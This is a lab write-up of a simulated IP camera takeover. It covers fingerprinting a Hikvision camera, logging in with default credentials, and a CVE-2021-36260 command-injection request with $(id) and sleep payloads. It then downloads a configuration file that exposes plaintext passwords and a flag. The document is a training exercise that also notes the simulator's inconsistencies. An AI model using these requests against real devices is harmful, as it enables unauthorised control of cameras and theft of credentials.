# M02: IP Camera Takeover | Lab Summary

**Mission:** M02 (Medium)  
**Status:** Completed (4/4 steps)  
**Target:** `192.168.0.15`  
**Device:** Hikvision `DS-2CD2143G0-I`  
**Reported firmware:** `V2.1.0 build 140721` (21 July 2014)  
**Vulnerability assessed:** CVE-2021-36260 (unauthenticated command injection; lab reports CVSS 9.8)  
**Flag:** `4343ff5ad0978b8d4d23aec625591f15`  
**Lab flag location:** `~/flags/flag1.txt`

> **Scope and evidence note:** This report records the supplied lab terminal transcript. The environment prints simulated results and `[replay]` responses, so a lab success message is not always evidence that the exact preceding shell command ran against a physical camera. Where the simulator's output is inconsistent with the literal command, the distinction is documented.

## Objective and workflow

Fingerprint the IP camera, test the supplied default credentials, demonstrate the command-injection flaw, and retrieve the camera configuration containing the flag.

| Step | Activity | Outcome |
| --- | --- | --- |
| 1 | Nmap and HTTP fingerprinting | **Complete:** camera identified; HTTP/RTSP services and `App-webs/7.0.0.0` reported |
| 2 | Default credential test | **Complete:** `admin:12345` authenticated to an ISAPI endpoint |
| 3 | CVE-2021-36260 validation | **Complete (lab):** simulator reported unauthenticated root command execution |
| 4 | Configuration download and XML inspection | **Complete:** `CustomTag` yielded the flag; two plaintext account passwords reported |

---

## Step 1: Device fingerprinting

### Commands used

**Nmap: selected TCP services and version detection**

```bash
sudo nmap -sV -sC -p 80,554 192.168.0.15
```

| Parameter | Description |
| --- | --- |
| `sudo` | Execute with elevated privileges. |
| `nmap` | Network mapper for host, port, and service enumeration. |
| `-sV` | Probe open ports for service/version information. |
| `-sC` | Run Nmap's default NSE script set. |
| `-p 80,554` | Request TCP ports 80 (HTTP) and 554 (RTSP). |
| `192.168.0.15` | Target camera IP address. |

**HTTP header request**

```bash
curl -I http://192.168.0.15/
```

| Parameter | Description |
| --- | --- |
| `curl` | HTTP client. |
| `-I` | Request response headers using the HEAD method. |
| `http://192.168.0.15/` | Camera web interface. |

### Recorded responses

The lab's Nmap output included:

```text
MAC: D8:49:2F:AA:BB:CC (Hangzhou Hikvision Digital Technology)
PORT      STATE  SERVICE   VERSION
80/tcp    open   http      Hikvision IP Camera httpd 2.1
  http-server-header: App-webs/7.0.0.0
554/tcp   open   rtsp      Hikvision RTSP
8000/tcp  open   sdk       Hikvision SDK
Firmware: V2.1.0 build 140721
CVE-2021-36260 APPLICABLE: firmware V2.x vulnerable to unauth RCE
[+] Step 1/4 complete! Proceed to step 2.
```

The subsequent `curl -I` invocation returned a **replayed** GET transcript rather than a HEAD response:

```http
GET /doc/page/login.asp HTTP/1.1
HTTP/1.1 200 OK
Server: App-webs/7.0.0.0
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
```

**Interpretation:** The lab reports the Hikvision web server fingerprint, the model/firmware, and HTTP/RTSP interfaces. Its Nmap output also lists TCP/8000 even though `-p 80,554` requested only two ports. That is a simulator-specific inconsistency; a conventional Nmap command with this port list would not separately scan TCP/8000. The `App-webs` banner is an identification clue, **not proof on its own** of CVE applicability.

---

## Step 2: Default credential assessment

### Command used

```bash
curl -i --basic -u admin:12345 http://192.168.0.15/ISAPI/System/deviceInfo
```

| Parameter | Description |
| --- | --- |
| `-i` | Include HTTP response headers in output. |
| `--basic` | Request HTTP Basic authentication. |
| `-u admin:12345` | Send the lab-provided admin username and password. |
| `/ISAPI/System/deviceInfo` | Hikvision device information API endpoint. |

### Recorded response

```http
Authorization: Basic YWRtaW46MTIzNDU=
HTTP/1.1 200 OK
```

```xml
<DeviceInfo>
  <deviceName>ACME-LOBBY-CAM-01</deviceName>
  <model>DS-2CD2143G0-I</model>
  <firmwareVersion>V2.1.0 build 140721</firmwareVersion>
</DeviceInfo>
```

```text
[+] DEFAULT CREDENTIALS CONFIRMED: admin:12345
[+] Step 2/4 complete! Proceed to step 3.
```

**Interpretation:** The successful `200 OK` plus device XML confirms that `admin:12345` was accepted by the lab's ISAPI endpoint. Basic authentication sends Base64-encoded credentials; Base64 is not encryption, and the request used unencrypted HTTP.

---

## Step 3: CVE-2021-36260 command injection

### Intended exploit test

The lab instructed a `PUT` request to the Hikvision web-language endpoint with XML containing a shell substitution. Shown below is the **correct multiline shell formatting** for the command attempted during the exercise:

```bash
curl -i -X PUT \
  'http://192.168.0.15/SDK/webLanguage' \
  -H 'Content-Type: application/xml' \
  --data-binary '<xml><language>$(id)</language></xml>'
```

| Parameter / element | Description |
| --- | --- |
| `-i` | Print HTTP response headers. |
| `-X PUT` | Use the HTTP PUT method. |
| `/SDK/webLanguage` | Web-language processing endpoint examined for CVE-2021-36260. |
| `-H 'Content-Type: application/xml'` | Identify the request body as XML. |
| `--data-binary` | Transmit the specified payload without form encoding. |
| `<language>...</language>` | XML element processed by the target application. |
| `$(id)` | Shell command substitution used here as a low-impact execution check. |
| Single quotes around XML | Prevent Kali's local shell from expanding `$(id)` before transmission. |
| Backslash at end of each line | Continue the shell command on the next line. |

### Additional requests actually entered

The user's literal pasted command used backslashes followed by spaces on **one line**, rather than backslashes at the ends of lines. The simulator returned a replay of Step 1, so it did not directly show a response attributable to the `$(id)` request.

A control request with an invalid language value was then entered:

```bash
curl -s -o /dev/null -w 'Time: %{time_total}s HTTP: %{http_code}\n' \
  -X PUT 'http://192.168.0.15/SDK/webLanguage' \
  --data-binary '<xml><language>invalid</language></xml>'
```

Relevant options: `-s` suppresses progress output, `-o /dev/null` discards the response body, and `-w` emits timing and status values. The user's original control invocation also had one-line backslash/space formatting; the version above is normalized for readability.

A timing-test request with `$(sleep 5)` was later entered, but the simulator returned `[replay] Step 3 already complete` rather than actual latency measurements.

### Recorded simulator response

```text
> PUT /SDK/webLanguage HTTP/1.1
< HTTP/1.1 500 Internal Server Error
< Server: App-webs/7.0.0.0
# Verifying execution: checking /tmp/pwned...
uid=0(root) gid=0(root) groups=0(root)
[!] UNAUTHENTICATED ROOT CODE EXECUTION CONFIRMED
[!] CVE-2021-36260 -- 192.168.0.15 fully compromised, ZERO credentials
[+] Step 3/4 complete! Proceed to step 4.
```

**Interpretation:** The simulator **marked Step 3 complete** and explicitly reported execution as `root` without authentication. An HTTP `500` alone cannot establish command execution; the lab's reported verification line is the decisive *simulated* evidence. Because the transcript associates that result with a control request and replays earlier steps, the literal request-to-effect relationship was not independently verified in the supplied output.

---

## Step 4: Configuration download and flag extraction

### Command used to download

```bash
curl -u admin:12345 -o hikvision_config.zip http://192.168.0.15/System/configurationFile
```

| Parameter | Description |
| --- | --- |
| `-u admin:12345` | Authenticate using the credentials confirmed in Step 2. |
| `-o hikvision_config.zip` | Save the HTTP response body to a local ZIP filename. |
| `/System/configurationFile` | Configuration export URL specified by the lab. |

### Commands shown in the lab's export/extraction response

```bash
unzip hikvision_config.zip
cat deviceConfig.xml
```

| Command | Description |
| --- | --- |
| `unzip hikvision_config.zip` | Extract the downloaded ZIP contents. |
| `cat deviceConfig.xml` | Print the extracted XML configuration to the terminal. |

These extraction operations appeared inside the simulator output, not as separate shell commands typed by the user.

### Recorded response

```text
GET /System/configurationFile?auth=YWRtaW46MTIZNDU=
< HTTP/1.1 200 OK -- Content-Type: application/zip
[+] Downloading hikvision_config.zip (47KB)...
# unzip hikvision_config.zip && cat deviceConfig.xml
```

```xml
<DeviceConfig>
  <User><n>admin</n><password>12345</password></User>
  <User><n>operator</n><password>acme2019</password></User>
  <CustomTag>4343ff5ad0978b8d4d23aec625591f15</CustomTag>
</DeviceConfig>
```

```text
[+] Flag found in CustomTag. All passwords exposed in plaintext.
flag captured: 4343ff5ad0978b8d4d23aec625591f15
saved to ~/flags/flag1.txt
[+] Mission M02 complete: IP Camera Takeover
```

The later `ls -lrt` display listed `capture-01.cap`, `hashes.kerberoast`, `nmap_output.txt`, and `flags/` but **did not list** `hikvision_config.zip`. Thus the provided record confirms the lab's simulated download/extraction and mission completion, but does not independently verify that a ZIP file remained in the working directory.

### Main findings in the configuration

| Item | Observed value | Significance |
| --- | --- | --- |
| Admin account | `admin / 12345` | Default administrative credentials. |
| Operator account | `operator / acme2019` | Additional account credential exposed in plaintext. |
| Custom flag field | `CustomTag` | Embedded lab flag value. |
| Flag | `4343ff5ad0978b8d4d23aec625591f15` | Mission completion token. |

---

## Consolidated command reference

```bash
# Step 1: service fingerprinting
sudo nmap -sV -sC -p 80,554 192.168.0.15
curl -I http://192.168.0.15/

# Step 2: default-credential check
curl -i --basic -u admin:12345 http://192.168.0.15/ISAPI/System/deviceInfo

# Step 3: command-injection test (normalized formatting)
curl -i -X PUT \
  'http://192.168.0.15/SDK/webLanguage' \
  -H 'Content-Type: application/xml' \
  --data-binary '<xml><language>$(id)</language></xml>'

# Step 4: configuration export and inspection
curl -u admin:12345 -o hikvision_config.zip http://192.168.0.15/System/configurationFile
unzip hikvision_config.zip
cat deviceConfig.xml
```

## Security implications

1. **Default credentials:** A known factory password provides management API access. Replacing default passwords prevents this particular initial-access path.
2. **Unauthenticated command injection:** The lab reports root command execution via CVE-2021-36260. A firmware-specific advisory and independent verification are needed to assess a non-simulated camera accurately.
3. **Plaintext secrets in configuration:** Exporting configuration can expose additional accounts and sensitive operational data; protect exports and avoid storing passwords in recoverable plaintext.
4. **Exposed management and streaming services:** The lab reports TCP/80 (HTTP), TCP/554 (RTSP), and TCP/8000 (SDK), expanding the reachable device attack surface.

## Final result

**Mission M02: COMPLETE (4/4 steps).**  
**Flag:** `4343ff5ad0978b8d4d23aec625591f15`  
**Saved by the lab to:** `~/flags/flag1.txt`

**Key lesson:** A single poorly secured IoT camera can combine weak administrative authentication, vulnerable web components, and overexposed configuration data. The strongest observations in this lab are successful ISAPI authentication and the returned configuration XML; the reported exploit confirmation comes from the lab simulator's verification message.
